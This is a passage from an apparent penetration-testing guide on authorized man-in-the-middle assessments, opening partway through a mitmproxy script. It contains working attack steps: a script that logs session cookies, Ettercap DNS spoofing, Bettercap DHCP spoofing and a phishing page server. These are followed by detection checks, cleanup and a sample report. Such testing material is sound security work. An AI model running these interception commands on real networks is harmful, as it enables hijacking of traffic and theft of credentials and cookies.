---
name: net-attack-mitm
description: - Testing whether applications properly validate TLS certificates and enforce encrypted communications - Demonstrating the risk of cleartext protocols (HTTP, FTP, Telnet, SMTP) to organization stakeholders - Validating that HSTS, certificate pinning, and other anti-MITM controls are correctly implemented - Assessing network detection capabilities f
domain: cybersecurity
---
\n")

def response(flow: http.HTTPFlow):
    # Log authentication cookies
    if "set-cookie" in flow.response.headers:
        with open("captured_cookies.log", "a") as f:
            f.write(f"URL: {flow.request.pretty_url}\n")
            f.write(f"Cookie: {flow.response.headers['set-cookie']}\n")
            f.write("---\n")
PYEOF

sudo mitmproxy --mode transparent -s extract_creds.py -w mitm_capture.flow
```

### Step 4: Perform DNS Spoofing and DHCP Attacks

```bash
# DNS spoofing with Ettercap
sudo tee /etc/ettercap/etter.dns << 'EOF'
# Redirect target domain to attacker's web server
example.com      A   192.168.1.99
*.example.com    A   192.168.1.99
www.example.com  A   192.168.1.99
EOF

sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.50// /192.168.1.1//

# DHCP spoofing with Bettercap (offer rogue DHCP with attacker as gateway)
sudo bettercap -iface eth0
> set dhcp6.spoof.domains example.com
> dhcp6.spoof on

# Set up a phishing page on the attacker machine
sudo python3 -m http.server 80 --directory /var/www/phishing/
```

### Step 5: Validate Detection and Test Controls

```bash
# Verify certificate pinning is working on the target application
# If the app rejects the MITM CA, certificate pinning is effective
# Check the target machine for certificate errors

# Test HSTS enforcement
# If browser refuses HTTP connection after initial HTTPS, HSTS is working
curl -v -k -L http://example.com 2>&1 | grep -i "strict-transport-security"

# Verify IDS detection of ARP spoofing
# Check Snort/Suricata alerts for ARP anomalies
grep -i "arp" /var/log/snort/alert_fast.txt

# Check if switch detected the attack (DAI logs)
# On Cisco switch: show ip arp inspection log

# Test network monitoring tools
# Verify that Zeek generated appropriate notices
cat /opt/zeek/logs/current/notice.log | zeek-cut note msg

# Capture evidence of successful/failed interception
tshark -i eth0 -f "host 192.168.1.50" -w mitm_evidence.pcapng -a duration:300
```

### Step 6: Clean Up and Document Results

```bash
# Stop all MITM attacks
# In Bettercap:
> arp.spoof off
> http.proxy off
> https.proxy off
> dns.spoof off
> quit

# Restore IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Remove iptables rules
sudo iptables -t nat -F PREROUTING

# Verify ARP tables are restored on target hosts
# The target should re-learn correct MAC addresses via normal ARP

# Force ARP cache refresh (from target machine)
# arp -d 192.168.1.1 && ping -c 1 192.168.1.1

# Remove test CA certificate from any systems where it was installed
# Remove capture files containing sensitive data per engagement agreement

# Generate documentation
echo "MITM Simulation completed at $(date)" >> mitm_report.txt
sha256sum mitm_capture.flow mitm_evidence.pcapng >> mitm_report.txt
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Man-in-the-Middle (MITM)** | Attack where the adversary secretly intercepts and potentially alters communication between two parties who believe they are communicating directly |
| **SSL Stripping** | Downgrade attack that converts HTTPS connections to HTTP by intercepting the initial HTTP request before the TLS upgrade, bypassing encryption |
| **HSTS (HTTP Strict Transport Security)** | Browser security policy that forces HTTPS connections and prevents SSL stripping by caching the requirement for encrypted connections |
| **Certificate Pinning** | Application security control that validates server certificates against a pre-configured set of trusted certificates, detecting MITM proxy certificates |
| **ARP Cache Poisoning** | Layer 2 attack technique that corrupts the ARP cache of target hosts to redirect traffic through the attacker's machine |
| **Transparent Proxy** | Proxy that intercepts traffic without requiring client-side configuration, typically using iptables REDIRECT rules to capture traffic destined for standard ports |

## Tools & Systems

- **Bettercap 2.x**: Swiss-army knife for network attacks supporting ARP/DNS/DHCP spoofing, HTTP/HTTPS proxying, and credential sniffing with a modular architecture
- **mitmproxy**: Interactive TLS-capable proxy for intercepting, inspecting, and modifying HTTP/HTTPS traffic with Python scripting support
- **Ettercap**: Legacy MITM tool supporting ARP spoofing, DNS spoofing, and plugin-based traffic manipulation
- **sslstrip**: Tool that implements SSL stripping attacks by proxying HTTP-to-HTTPS redirects and serving downgraded HTTP versions
- **Wireshark**: Packet analyzer for verifying traffic interception and capturing evidence of successful or failed MITM attempts

## Common Scenarios

### Scenario: Testing HTTPS Enforcement on an Internal Web Application

**Context**: A development team claims their internal web application enforces HTTPS with HSTS and certificate pinning. The security team needs to verify these controls during an authorized assessment. The application runs on 10.10.20.50 and is accessed by workstations on the 10.10.1.0/24 VLAN.

**Approach**:
1. Set up Bettercap on the same VLAN and ARP-spoof a test workstation (10.10.1.100)
2. Enable SSL stripping via Bettercap's HTTP proxy to test whether the application can be downgraded to HTTP
3. Enable HTTPS interception with a test CA certificate to test certificate validation
4. Attempt to access the application from the test workstation and observe whether the browser or application rejects the connection
5. Verify that HSTS headers are present and have appropriate max-age values
6. Document that the thick client does not implement certificate pinning (accepts the MITM CA) while the web browser properly rejects it due to HSTS preload
7. Recommend implementing certificate pinning in the thick client application

**Pitfalls**:
- Forgetting to enable IP forwarding, causing a denial of service instead of transparent interception
- Testing SSL stripping on an application with HSTS preloaded in the browser and concluding HSTS works, when a fresh browser instance might be vulnerable
- Not cleaning up ARP spoofing after testing, causing intermittent connectivity issues for the target
- Running mitmproxy without the transparent mode flag, requiring manual proxy configuration that changes the test conditions

## Output Format

```
## MITM Simulation Report

**Test ID**: MITM-2024-001
**Date**: 2024-03-15 14:00-16:00 UTC
**Target Application**: https://app.internal.corp (10.10.20.50)
**Test Workstation**: 10.10.1.100
**Attacker Machine**: 10.10.1.99

### Control Validation Results

| Control | Status | Details |
|---------|--------|---------|
| HTTPS Redirect | PASS | HTTP requests redirect to HTTPS with 301 |
| HSTS Header | PASS | max-age=31536000; includeSubDomains; preload |
| SSL Stripping (Browser) | BLOCKED | HSTS prevents downgrade in Chrome/Firefox |
| SSL Stripping (Thick Client) | VULNERABLE | Client follows HTTP redirect without HSTS |
| Cert Pinning (Browser) | N/A | Standard CA validation only |
| Cert Pinning (Thick Client) | VULNERABLE | Accepts MITM CA without validation |
| IDS Detection | PASS | Snort generated ARP spoof alert in 12 seconds |

### Recommendations
1. Implement certificate pinning in the thick client (high priority)
2. Add HSTS preload list submission for the domain
3. Enable DAI on access-layer switches for Layer 2 protection
4. Configure application to reject connections from non-pinned certificates
```